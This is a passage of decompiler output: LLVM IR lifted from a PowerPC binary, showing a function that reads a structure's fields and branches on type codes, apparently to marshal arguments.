  %r9.global-to-local = alloca i32, align 4
  %v0_1000d780 = load i32, i32* @r3, align 4
  %v1_1000d780 = add i32 %v0_1000d780, 24
  %v2_1000d780 = inttoptr i32 %v1_1000d780 to i32*
  %v3_1000d780 = load i32, i32* %v2_1000d780, align 4
  store i32 %v3_1000d780, i32* %r0.global-to-local, align 4
  %v1_1000d784 = add i32 %v0_1000d780, 88
  store i32 %v1_1000d784, i32* @r8, align 4
  %v1_1000d788 = add i32 %v0_1000d780, 8
  %v2_1000d788 = inttoptr i32 %v1_1000d788 to i32*
  %v3_1000d788 = load i32, i32* %v2_1000d788, align 4
  store i32 %v3_1000d788, i32* %r9.global-to-local, align 4
  %v2_1000d78c = icmp sgt i32 %v3_1000d780, 0
  %v3_1000d78c = icmp eq i32 %v3_1000d780, 0
  store i1 %v2_1000d78c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d78c, label %dec_label_pc_1000d794, label %dec_label_pc_1000d980

dec_label_pc_1000d794:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000d798 = icmp ne i32 %v3_1000d788, -2147483648
  %v4_1000d798 = icmp eq i32 %v3_1000d788, -2147483648
  store i1 %v3_1000d798, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d798, label %dec_label_pc_1000d7a0, label %dec_label_pc_1000d7e0

dec_label_pc_1000d7a0:                            ; preds = %dec_label_pc_1000d794
  %v1_1000d7a0 = add i32 %v0_1000d780, 76
  %v2_1000d7a0 = inttoptr i32 %v1_1000d7a0 to i8*
  %v3_1000d7a0 = load i8, i8* %v2_1000d7a0, align 1
  %v4_1000d7a0 = zext i8 %v3_1000d7a0 to i32
  store i32 %v4_1000d7a0, i32* %r10.global-to-local, align 4
  store i32 %v1_1000d7a0, i32* %r11.global-to-local, align 4
  %v2_1000d7a8 = icmp ugt i8 %v3_1000d7a0, 8
  store i1 %v2_1000d7a8, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000d7a0, 7
  br i1 %tmp, label %dec_label_pc_1000d7c8, label %dec_label_pc_1000d7b0

dec_label_pc_1000d7b0:                            ; preds = %dec_label_pc_1000d7a0
  %v1_1000d7b0 = add i32 %v0_1000d780, 84
  %v2_1000d7b0 = inttoptr i32 %v1_1000d7b0 to i32*
  %v3_1000d7b0 = load i32, i32* %v2_1000d7b0, align 4
  %v1_1000d7b4 = mul nuw nsw i32 %v4_1000d7a0, 4
  %v2_1000d7b8 = add i32 %v3_1000d7b0, %v1_1000d7b4
  store i32 %v2_1000d7b8, i32* %r9.global-to-local, align 4
  %v1_1000d7bc = add nuw nsw i32 %v4_1000d7a0, 1
  store i32 %v1_1000d7bc, i32* %r0.global-to-local, align 4
  %v1_1000d7c0 = trunc i32 %v1_1000d7bc to i8
  store i8 %v1_1000d7c0, i8* %v2_1000d7a0, align 1
  br label %dec_label_pc_1000d7d4

dec_label_pc_1000d7c8:                            ; preds = %dec_label_pc_1000d7a0
  %v1_1000d7c8 = add i32 %v0_1000d780, 80
  %v2_1000d7c8 = inttoptr i32 %v1_1000d7c8 to i32*
  %v3_1000d7c8 = load i32, i32* %v2_1000d7c8, align 4
  store i32 %v3_1000d7c8, i32* %r9.global-to-local, align 4
  %v1_1000d7cc = add i32 %v3_1000d7c8, 4
  store i32 %v1_1000d7cc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d7cc, i32* %v2_1000d7c8, align 4
  br label %dec_label_pc_1000d7d4

dec_label_pc_1000d7d4:                            ; preds = %dec_label_pc_1000d7b0, %dec_label_pc_1000d7c8
  %v0_1000d7d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d7d4 = inttoptr i32 %v0_1000d7d4 to i32*
  %v2_1000d7d4 = load i32, i32* %v1_1000d7d4, align 4
  store i32 %v2_1000d7d4, i32* %r0.global-to-local, align 4
  %v1_1000d7d8 = load i32, i32* @r8, align 4
  %v2_1000d7d8 = inttoptr i32 %v1_1000d7d8 to i32*
  store i32 %v2_1000d7d4, i32* %v2_1000d7d8, align 4
  %v0_1000d7dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d7dc = load i32, i32* @r3, align 4
  %v2_1000d7dc = add i32 %v1_1000d7dc, 8
  %v3_1000d7dc = inttoptr i32 %v2_1000d7dc to i32*
  store i32 %v0_1000d7dc, i32* %v3_1000d7dc, align 4
  %v0_1000d7e0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d7e0

dec_label_pc_1000d7e0:                            ; preds = %dec_label_pc_1000d794, %dec_label_pc_1000d7d4
  %v2_1000d810 = phi i32 [ %v0_1000d780, %dec_label_pc_1000d794 ], [ %v0_1000d7e0.pre, %dec_label_pc_1000d7d4 ]
  %v1_1000d7e0 = add i32 %v2_1000d810, 4
  %v2_1000d7e0 = inttoptr i32 %v1_1000d7e0 to i32*
  %v3_1000d7e0 = load i32, i32* %v2_1000d7e0, align 4
  store i32 %v3_1000d7e0, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000d7e8 = icmp ne i32 %v3_1000d7e0, -2147483648
  %v4_1000d7e8 = icmp eq i32 %v3_1000d7e0, -2147483648
  store i1 %v3_1000d7e8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d7e8, label %dec_label_pc_1000d7f0, label %dec_label_pc_1000d970.preheader

dec_label_pc_1000d7f0:                            ; preds = %dec_label_pc_1000d7e0
  %v1_1000d7f0 = add i32 %v2_1000d810, 76
  %v2_1000d7f0 = inttoptr i32 %v1_1000d7f0 to i8*
  %v3_1000d7f0 = load i8, i8* %v2_1000d7f0, align 1
  %v4_1000d7f0 = zext i8 %v3_1000d7f0 to i32
  store i32 %v4_1000d7f0, i32* %r10.global-to-local, align 4
  store i32 %v1_1000d7f0, i32* %r11.global-to-local, align 4
  %v2_1000d7f8 = icmp ugt i8 %v3_1000d7f0, 8
  store i1 %v2_1000d7f8, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000d7f0, 7
  br i1 %tmp22, label %dec_label_pc_1000d818, label %dec_label_pc_1000d800

dec_label_pc_1000d800:                            ; preds = %dec_label_pc_1000d7f0
  %v1_1000d800 = add i32 %v2_1000d810, 84
  %v2_1000d800 = inttoptr i32 %v1_1000d800 to i32*
  %v3_1000d800 = load i32, i32* %v2_1000d800, align 4
  %v1_1000d804 = mul nuw nsw i32 %v4_1000d7f0, 4
  %v2_1000d808 = add i32 %v3_1000d800, %v1_1000d804
  store i32 %v2_1000d808, i32* %r9.global-to-local, align 4
  %v1_1000d80c = add nuw nsw i32 %v4_1000d7f0, 1
  store i32 %v1_1000d80c, i32* %r0.global-to-local, align 4
  %v1_1000d810 = trunc i32 %v1_1000d80c to i8
  store i8 %v1_1000d810, i8* %v2_1000d7f0, align 1
  br label %dec_label_pc_1000d824

dec_label_pc_1000d818:                            ; preds = %dec_label_pc_1000d7f0
  %v1_1000d818 = add i32 %v2_1000d810, 80
  %v2_1000d818 = inttoptr i32 %v1_1000d818 to i32*
  %v3_1000d818 = load i32, i32* %v2_1000d818, align 4
  store i32 %v3_1000d818, i32* %r9.global-to-local, align 4
  %v1_1000d81c = add i32 %v3_1000d818, 4
  store i32 %v1_1000d81c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d81c, i32* %v2_1000d818, align 4
  br label %dec_label_pc_1000d824

dec_label_pc_1000d824:                            ; preds = %dec_label_pc_1000d800, %dec_label_pc_1000d818
  %v0_1000d824 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d824 = inttoptr i32 %v0_1000d824 to i32*
  %v2_1000d824 = load i32, i32* %v1_1000d824, align 4
  store i32 %v2_1000d824, i32* %r0.global-to-local, align 4
  %v1_1000d828 = load i32, i32* @r8, align 4
  %v2_1000d828 = inttoptr i32 %v1_1000d828 to i32*
  store i32 %v2_1000d824, i32* %v2_1000d828, align 4
  %v0_1000d82c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d82c = load i32, i32* @r3, align 4
  %v2_1000d82c = add i32 %v1_1000d82c, 4
  %v3_1000d82c = inttoptr i32 %v2_1000d82c to i32*
  store i32 %v0_1000d82c, i32* %v3_1000d82c, align 4
  %v0_1000d9705.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d970.preheader

dec_label_pc_1000d970.preheader:                  ; preds = %dec_label_pc_1000d7e0, %dec_label_pc_1000d824
  %v0_1000d9705 = phi i32 [ %v2_1000d810, %dec_label_pc_1000d7e0 ], [ %v0_1000d9705.pre, %dec_label_pc_1000d824 ]
  store i32 0, i32* @r7, align 4
  %v1_1000d9706 = add i32 %v0_1000d9705, 28
  %v2_1000d9707 = inttoptr i32 %v1_1000d9706 to i32*
  %v3_1000d9708 = load i32, i32* %v2_1000d9707, align 4
  store i32 %v3_1000d9708, i32* %r0.global-to-local, align 4
  %v2_1000d9749 = icmp sgt i32 %v3_1000d9708, 0
  %v3_1000d97410 = icmp slt i32 %v3_1000d9708, 0
  store i1 %v3_1000d97410, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d9749, label %dec_label_pc_1000d838, label %dec_label_pc_1000d9c0

dec_label_pc_1000d838:                            ; preds = %dec_label_pc_1000d970.preheader, %dec_label_pc_1000d96c
  %v2_1000d94c = phi i32 [ %v0_1000d970, %dec_label_pc_1000d96c ], [ %v0_1000d9705, %dec_label_pc_1000d970.preheader ]
  %v0_1000d838 = phi i32 [ %v1_1000d96c, %dec_label_pc_1000d96c ], [ 0, %dec_label_pc_1000d970.preheader ]
  %v1_1000d838 = mul i32 %v0_1000d838, 4
  %v2_1000d83c = add i32 %v1_1000d838, %v2_1000d94c
  store i32 %v2_1000d83c, i32* %r9.global-to-local, align 4
  %v1_1000d840 = add i32 %v2_1000d83c, 40
  %v2_1000d840 = inttoptr i32 %v1_1000d840 to i32*
  %v3_1000d840 = load i32, i32* %v2_1000d840, align 4
  store i32 %v3_1000d840, i32* %r0.global-to-local, align 4
  %v2_1000d844 = icmp sgt i32 %v3_1000d840, 8
  %v3_1000d844 = icmp eq i32 %v3_1000d840, 8
  store i1 %v2_1000d844, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d844, label %dec_label_pc_1000d96c, label %dec_label_pc_1000d84c

dec_label_pc_1000d84c:                            ; preds = %dec_label_pc_1000d838
  %v1_1000d84c = add i32 %v2_1000d94c, 76
  store i32 %v1_1000d84c, i32* %r10.global-to-local, align 4
  br i1 %v2_1000d844, label %dec_label_pc_1000d868, label %dec_label_pc_1000d854

dec_label_pc_1000d854:                            ; preds = %dec_label_pc_1000d84c
  %v2_1000d854 = icmp sgt i32 %v3_1000d840, 2
  store i1 %v2_1000d854, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000d840, 3
  br i1 %tmp23, label %dec_label_pc_1000d930, label %dec_label_pc_1000d880

dec_label_pc_1000d868:                            ; preds = %dec_label_pc_1000d84c
  %v2_1000d868 = icmp sgt i32 %v3_1000d840, 1024
  store i1 %v2_1000d868, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000d840, 1025
  br i1 %tmp24, label %dec_label_pc_1000d930, label %dec_label_pc_1000d874

dec_label_pc_1000d874:                            ; preds = %dec_label_pc_1000d868
  %v2_1000d874 = icmp sgt i32 %v3_1000d840, 2048
  %v3_1000d874 = icmp eq i32 %v3_1000d840, 2048
  store i1 %v2_1000d874, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d874, label %dec_label_pc_1000d888, label %dec_label_pc_1000d87c

dec_label_pc_1000d87c:                            ; preds = %dec_label_pc_1000d874
  %v2_1000d87c = icmp sgt i32 %v3_1000d840, 2055
  %v3_1000d87c = icmp eq i32 %v3_1000d840, 2055
  store i1 %v2_1000d87c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d87c, label %dec_label_pc_1000d8e4, label %dec_label_pc_1000d930

dec_label_pc_1000d880:                            ; preds = %dec_label_pc_1000d854
  %v3_1000d860 = icmp eq i32 %v3_1000d840, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d860, label %dec_label_pc_1000d8e4, label %dec_label_pc_1000d930

dec_label_pc_1000d888:                            ; preds = %dec_label_pc_1000d874
  %v2_1000d888 = inttoptr i32 %v1_1000d84c to i8*
  %v3_1000d888 = load i8, i8* %v2_1000d888, align 1
  %v4_1000d888 = zext i8 %v3_1000d888 to i32
  %v2_1000d88c = icmp ugt i8 %v3_1000d888, 6
  store i1 %v2_1000d88c, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000d888, 2
  %v1_1000d890 = zext i8 %tmp28 to i32
  store i32 %v1_1000d890, i32* %r9.global-to-local, align 4
  %v2_1000d894 = add nuw nsw i32 %v1_1000d890, %v4_1000d888
  store i32 %v2_1000d894, i32* %r0.global-to-local, align 4
  %v1_1000d898 = trunc i32 %v2_1000d894 to i8
  store i8 %v1_1000d898, i8* %v2_1000d888, align 1
  %v0_1000d89c = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000d89c, label %dec_label_pc_1000d8bc, label %dec_label_pc_1000d8a0

dec_label_pc_1000d8a0:                            ; preds = %dec_label_pc_1000d888
  %v0_1000d8a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d8a0 = urem i32 %v0_1000d8a0, 256
  store i32 %v1_1000d8a0, i32* %r9.global-to-local, align 4
  %v0_1000d8a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d8a4 = add i32 %v0_1000d8a4, 8
  %v2_1000d8a4 = inttoptr i32 %v1_1000d8a4 to i32*
  %v3_1000d8a4 = load i32, i32* %v2_1000d8a4, align 4
  %v1_1000d8a8 = mul nuw nsw i32 %v1_1000d8a0, 4
  store i32 %v1_1000d8a8, i32* %r0.global-to-local, align 4
  %v1_1000d8ac = add nuw nsw i32 %v1_1000d8a0, 2
  store i32 %v1_1000d8ac, i32* %r9.global-to-local, align 4
  %v2_1000d8b0 = add i32 %v3_1000d8a4, %v1_1000d8a8
  store i32 %v2_1000d8b0, i32* %r11.global-to-local, align 4
  %v1_1000d8b4 = trunc i32 %v1_1000d8ac to i8
  %v2_1000d8b4 = load i32, i32* @r3, align 4
  %v3_1000d8b4 = add i32 %v2_1000d8b4, 76
  %v4_1000d8b4 = inttoptr i32 %v3_1000d8b4 to i8*
  store i8 %v1_1000d8b4, i8* %v4_1000d8b4, align 1
  br label %dec_label_pc_1000d8d0

dec_label_pc_1000d8bc:                            ; preds = %dec_label_pc_1000d888
  %v0_1000d8bc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d8bc = add i32 %v0_1000d8bc, 4
  %v2_1000d8bc = inttoptr i32 %v1_1000d8bc to i32*
  %v3_1000d8bc = load i32, i32* %v2_1000d8bc, align 4
  %v1_1000d8c0 = add i32 %v3_1000d8bc, 7
  store i32 %v1_1000d8c0, i32* %r9.global-to-local, align 4
  %v1_1000d8c4 = call i32 @__asm_rlwinm(i32 %v1_1000d8c0, i32 0, i32 0, i32 28)
  store i32 %v1_1000d8c4, i32* %r11.global-to-local, align 4
  %v1_1000d8c8 = add i32 %v1_1000d8c4, 8
  store i32 %v1_1000d8c8, i32* %r0.global-to-local, align 4
  %v1_1000d8cc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d8cc = add i32 %v1_1000d8cc, 4
  %v3_1000d8cc = inttoptr i32 %v2_1000d8cc to i32*
  store i32 %v1_1000d8c8, i32* %v3_1000d8cc, align 4
  br label %dec_label_pc_1000d8d0

dec_label_pc_1000d8d0:                            ; preds = %dec_label_pc_1000d8a0, %dec_label_pc_1000d8bc
  %v0_1000d8d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d8d0 = inttoptr i32 %v0_1000d8d0 to i32*
  %v2_1000d8d0 = load i32, i32* %v1_1000d8d0, align 4
  store i32 %v2_1000d8d0, i32* %r9.global-to-local, align 4
  %v1_1000d8d4 = add i32 %v0_1000d8d0, 4
  %v2_1000d8d4 = inttoptr i32 %v1_1000d8d4 to i32*
  %v3_1000d8d4 = load i32, i32* %v2_1000d8d4, align 4
  store i32 %v3_1000d8d4, i32* %r10.global-to-local, align 4
  %v1_1000d8d8 = load i32, i32* @r8, align 4
  %v2_1000d8d8 = inttoptr i32 %v1_1000d8d8 to i32*
  store i32 %v2_1000d8d0, i32* %v2_1000d8d8, align 4
  %v0_1000d8dc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d8dc = load i32, i32* @r8, align 4
  %v2_1000d8dc = add i32 %v1_1000d8dc, 4
  %v3_1000d8dc = inttoptr i32 %v2_1000d8dc to i32*
  store i32 %v0_1000d8dc, i32* %v3_1000d8dc, align 4
  br label %dec_label_pc_1000d968

dec_label_pc_1000d8e4:                            ; preds = %dec_label_pc_1000d87c, %dec_label_pc_1000d880
  store i32 %v1_1000d84c, i32* %r10.global-to-local, align 4
  %v1_1000d8e8 = add i32 %v2_1000d94c, 77
  %v2_1000d8e8 = inttoptr i32 %v1_1000d8e8 to i8*
  %v3_1000d8e8 = load i8, i8* %v2_1000d8e8, align 1
  %v4_1000d8e8 = zext i8 %v3_1000d8e8 to i32
  store i32 %v4_1000d8e8, i32* %r11.global-to-local, align 4
  %v2_1000d8ec = icmp ugt i8 %v3_1000d8e8, 8
  store i1 %v2_1000d8ec, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000d8e8, 7
  br i1 %tmp25, label %dec_label_pc_1000d910, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8e4
  %v1_1000d8f4 = add i32 %v2_1000d94c, 84
  %v2_1000d8f4 = inttoptr i32 %v1_1000d8f4 to i32*
  %v3_1000d8f4 = load i32, i32* %v2_1000d8f4, align 4
  %v1_1000d8f8 = mul nuw nsw i32 %v4_1000d8e8, 8
  %v1_1000d8fc = add nuw nsw i32 %v1_1000d8f8, 32
  %v2_1000d900 = add i32 %v1_1000d8fc, %v3_1000d8f4
  store i32 %v2_1000d900, i32* %r9.global-to-local, align 4
  %v1_1000d904 = add nuw nsw i32 %v4_1000d8e8, 1
  store i32 %v1_1000d904, i32* %r0.global-to-local, align 4
  %v1_1000d908 = trunc i32 %v1_1000d904 to i8
  store i8 %v1_1000d908, i8* %v2_1000d8e8, align 1
  br label %dec_label_pc_1000d968

dec_label_pc_1000d910:                            ; preds = %dec_label_pc_1000d8e4
  %v1_1000d910 = add i32 %v2_1000d94c, 80
  %v2_1000d910 = inttoptr i32 %v1_1000d910 to i32*
  %v3_1000d910 = load i32, i32* %v2_1000d910, align 4
  %v1_1000d914 = add i32 %v3_1000d910, 7
  store i32 %v1_1000d914, i32* %r9.global-to-local, align 4
  %v1_1000d918 = call i32 @__asm_rlwinm(i32 %v1_1000d914, i32 0, i32 0, i32 28)
  store i32 %v1_1000d918, i32* %r9.global-to-local, align 4
  %v1_1000d91c = add i32 %v1_1000d918, 8
  store i32 %v1_1000d91c, i32* %r0.global-to-local, align 4
  %v1_1000d920 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d920 = add i32 %v1_1000d920, 4
  %v3_1000d920 = inttoptr i32 %v2_1000d920 to i32*
  store i32 %v1_1000d91c, i32* %v3_1000d920, align 4
  br label %dec_label_pc_1000d968

dec_label_pc_1000d930:                            ; preds = %dec_label_pc_1000d87c, %dec_label_pc_1000d880, %dec_label_pc_1000d868, %dec_label_pc_1000d854
  %v2_1000d930 = inttoptr i32 %v1_1000d84c to i8*
  %v3_1000d930 = load i8, i8* %v2_1000d930, align 1
  %v4_1000d930 = zext i8 %v3_1000d930 to i32
  store i32 %v4_1000d930, i32* %r11.global-to-local, align 4
  %v2_1000d934 = icmp ugt i8 %v3_1000d930, 8
  store i1 %v2_1000d934, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000d930, 7
  br i1 %tmp26, label %dec_label_pc_1000d954, label %dec_label_pc_1000d93c

dec_label_pc_1000d93c:                            ; preds = %dec_label_pc_1000d930
  %v1_1000d93c = add i32 %v2_1000d94c, 84
  %v2_1000d93c = inttoptr i32 %v1_1000d93c to i32*
  %v3_1000d93c = load i32, i32* %v2_1000d93c, align 4
  %v1_1000d940 = mul nuw nsw i32 %v4_1000d930, 4
  %v2_1000d944 = add i32 %v3_1000d93c, %v1_1000d940
  store i32 %v2_1000d944, i32* %r9.global-to-local, align 4
  %v1_1000d948 = add nuw nsw i32 %v4_1000d930, 1
  store i32 %v1_1000d948, i32* %r0.global-to-local, align 4
  %v1_1000d94c = trunc i32 %v1_1000d948 to i8
  store i8 %v1_1000d94c, i8* %v2_1000d930, align 1
  br label %dec_label_pc_1000d960

dec_label_pc_1000d954:                            ; preds = %dec_label_pc_1000d930
  %v1_1000d954 = add i32 %v2_1000d94c, 80
  %v2_1000d954 = inttoptr i32 %v1_1000d954 to i32*
  %v3_1000d954 = load i32, i32* %v2_1000d954, align 4
  store i32 %v3_1000d954, i32* %r9.global-to-local, align 4
  %v1_1000d958 = add i32 %v3_1000d954, 4
  store i32 %v1_1000d958, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d958, i32* %v2_1000d954, align 4
  br label %dec_label_pc_1000d960

dec_label_pc_1000d960:                            ; preds = %dec_label_pc_1000d93c, %dec_label_pc_1000d954
  %v0_1000d960 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d960 = inttoptr i32 %v0_1000d960 to i32*
  %v2_1000d960 = load i32, i32* %v1_1000d960, align 4
  store i32 %v2_1000d960, i32* %r0.global-to-local, align 4
  %v1_1000d964 = load i32, i32* @r8, align 4
  %v2_1000d964 = inttoptr i32 %v1_1000d964 to i32*
  store i32 %v2_1000d960, i32* %v2_1000d964, align 4
  br label %dec_label_pc_1000d968

dec_label_pc_1000d968:                            ; preds = %dec_label_pc_1000d910, %dec_label_pc_1000d8f4, %dec_label_pc_1000d8d0, %dec_label_pc_1000d960
  %v0_1000d968 = load i32, i32* @r8, align 4
  %v1_1000d968 = add i32 %v0_1000d968, 8
  store i32 %v1_1000d968, i32* @r8, align 4
  %v0_1000d96c.pre = load i32, i32* @r7, align 4
  %v0_1000d970.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d96c

dec_label_pc_1000d96c:                            ; preds = %dec_label_pc_1000d838, %dec_label_pc_1000d968
  %v0_1000d970 = phi i32 [ %v2_1000d94c, %dec_label_pc_1000d838 ], [ %v0_1000d970.pre, %dec_label_pc_1000d968 ]
  %v0_1000d96c = phi i32 [ %v0_1000d838, %dec_label_pc_1000d838 ], [ %v0_1000d96c.pre, %dec_label_pc_1000d968 ]
  %v1_1000d96c = add i32 %v0_1000d96c, 1
  store i32 %v1_1000d96c, i32* @r7, align 4
  %v1_1000d970 = add i32 %v0_1000d970, 28
  %v2_1000d970 = inttoptr i32 %v1_1000d970 to i32*
  %v3_1000d970 = load i32, i32* %v2_1000d970, align 4
  store i32 %v3_1000d970, i32* %r0.global-to-local, align 4
  %v2_1000d974 = icmp slt i32 %v1_1000d96c, %v3_1000d970
  %v3_1000d974 = icmp sgt i32 %v1_1000d96c, %v3_1000d970
  store i1 %v3_1000d974, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d974, label %dec_label_pc_1000d838, label %dec_label_pc_1000d9c0

dec_label_pc_1000d980:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000d984 = icmp ne i32 %v3_1000d788, -2147483648
  %v4_1000d984 = icmp eq i32 %v3_1000d788, -2147483648
  store i1 %v3_1000d984, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d984, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d9a0

dec_label_pc_1000d98c:                            ; preds = %dec_label_pc_1000d980
  %v1_1000d98c = add i32 %v0_1000d780, 36
  %v2_1000d98c = inttoptr i32 %v1_1000d98c to i8*
  %v3_1000d98c = load i8, i8* %v2_1000d98c, align 1
  %v4_1000d98c = zext i8 %v3_1000d98c to i32
  %v1_1000d990 = mul nuw nsw i32 %v4_1000d98c, 8
  %v2_1000d994 = add i32 %v1_1000d990, %v1_1000d784
  store i32 %v2_1000d994, i32* %r9.global-to-local, align 4
  %v1_1000d998 = add i32 %v2_1000d994, -8
  %v2_1000d998 = inttoptr i32 %v1_1000d998 to i32*
  %v3_1000d998 = load i32, i32* %v2_1000d998, align 4
  store i32 %v3_1000d998, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d998, i32* %v2_1000d788, align 4
  %v0_1000d9a0.pre = load i32, i32* @r3, align 4
  %v1_1000d9a4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d9a0

dec_label_pc_1000d9a0:                            ; preds = %dec_label_pc_1000d980, %dec_label_pc_1000d98c
  %v1_1000d9a4 = phi i32 [ -2147483648, %dec_label_pc_1000d980 ], [ %v1_1000d9a4.pre, %dec_label_pc_1000d98c ]
  %v1_1000d9bc = phi i32 [ %v0_1000d780, %dec_label_pc_1000d980 ], [ %v0_1000d9a0.pre, %dec_label_pc_1000d98c ]
  %v1_1000d9a0 = add i32 %v1_1000d9bc, 4
  %v2_1000d9a0 = inttoptr i32 %v1_1000d9a0 to i32*
  %v3_1000d9a0 = load i32, i32* %v2_1000d9a0, align 4
  store i32 %v3_1000d9a0, i32* %r0.global-to-local, align 4
  %v3_1000d9a4 = icmp sgt i32 %v3_1000d9a0, %v1_1000d9a4
  %v4_1000d9a4 = icmp eq i32 %v3_1000d9a0, %v1_1000d9a4
  store i1 %v3_1000d9a4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d9a4, label %dec_label_pc_1000d9ac, label %dec_label_pc_1000d9c0

dec_label_pc_1000d9ac:                            ; preds = %dec_label_pc_1000d9a0
  %v1_1000d9ac = add i32 %v1_1000d9bc, 37
  %v2_1000d9ac = inttoptr i32 %v1_1000d9ac to i8*
  %v3_1000d9ac = load i8, i8* %v2_1000d9ac, align 1
  %v4_1000d9ac = zext i8 %v3_1000d9ac to i32
  %v1_1000d9b0 = mul nuw nsw i32 %v4_1000d9ac, 8
  %v1_1000d9b4 = load i32, i32* @r8, align 4
  %v2_1000d9b4 = add i32 %v1_1000d9b0, %v1_1000d9b4
  store i32 %v2_1000d9b4, i32* %r9.global-to-local, align 4
  %v1_1000d9b8 = add i32 %v2_1000d9b4, -8
  %v2_1000d9b8 = inttoptr i32 %v1_1000d9b8 to i32*
  %v3_1000d9b8 = load i32, i32* %v2_1000d9b8, align 4
  store i32 %v3_1000d9b8, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d9b8, i32* %v2_1000d9a0, align 4
  %v0_1000d9c0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d9c0

dec_label_pc_1000d9c0:                            ; preds = %dec_label_pc_1000d96c, %dec_label_pc_1000d970.preheader, %dec_label_pc_1000d9a0, %dec_label_pc_1000d9ac
  %v0_1000d9c0 = phi i32 [ %v1_1000d9bc, %dec_label_pc_1000d9a0 ], [ %v0_1000d9c0.pre, %dec_label_pc_1000d9ac ], [ %v0_1000d9705, %dec_label_pc_1000d970.preheader ], [ %v0_1000d970, %dec_label_pc_1000d96c ]
  %v1_1000d9c0 = add i32 %v0_1000d9c0, 8
  %v2_1000d9c0 = inttoptr i32 %v1_1000d9c0 to i32*
  %v3_1000d9c0 = load i32, i32* %v2_1000d9c0, align 4
  store i32 %v3_1000d9c0, i32* %r11.global-to-local, align 4
  %v2_1000d9c4 = icmp sgt i32 %v3_1000d9c0, 0
  store i1 %v2_1000d9c4, i1* %cr7_gt.global-to-local, align 1
  %v0_1000d9c8 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000d9c0, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000d9c8)
  %v0_1000d9cc = load i32, i32* @r3, align 4
  %v1_1000d9cc = add i32 %v0_1000d9cc, 16
  %v2_1000d9cc = inttoptr i32 %v1_1000d9cc to i32*
  %v3_1000d9cc = load i32, i32* %v2_1000d9cc, align 4
  store i32 %v3_1000d9cc, i32* %r0.global-to-local, align 4
  %v0_1000d9d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d9d0 = sub i32 0, %v0_1000d9d0
  store i32 %v1_1000d9d0, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000d9d8 = add i32 %v0_1000d9cc, 8
  %v3_1000d9d8 = inttoptr i32 %v2_1000d9d8 to i32*
  store i32 %v1_1000d9d0, i32* %v3_1000d9d8, align 4
  %v0_1000d9dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d9dc = or i32 %v0_1000d9dc, 8
  store i32 %v1_1000d9dc, i32* %r0.global-to-local, align 4
  %v0_1000d9e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d9e0 = load i32, i32* @r3, align 4
  %v2_1000d9e0 = add i32 %v1_1000d9e0, 20
  %v3_1000d9e0 = inttoptr i32 %v2_1000d9e0 to i32*
  store i32 %v0_1000d9e0, i32* %v3_1000d9e0, align 4
  %v1_1000d9e4 = call i32 @__asm_rlwinm(i32 %v1_1000d9dc, i32 0, i32 0, i32 30)
  store i32 %v1_1000d9e4, i32* %r0.global-to-local, align 4
  %v1_1000d9e8 = load i32, i32* @r3, align 4
  %v2_1000d9e8 = add i32 %v1_1000d9e8, 16
  %v3_1000d9e8 = inttoptr i32 %v2_1000d9e8 to i32*
  store i32 %v1_1000d9e4, i32* %v3_1000d9e8, align 4
  %v0_1000d9ec = load i32, i32* @r3, align 4
  ret i32 %v0_1000d9ec

; uselistorder directives
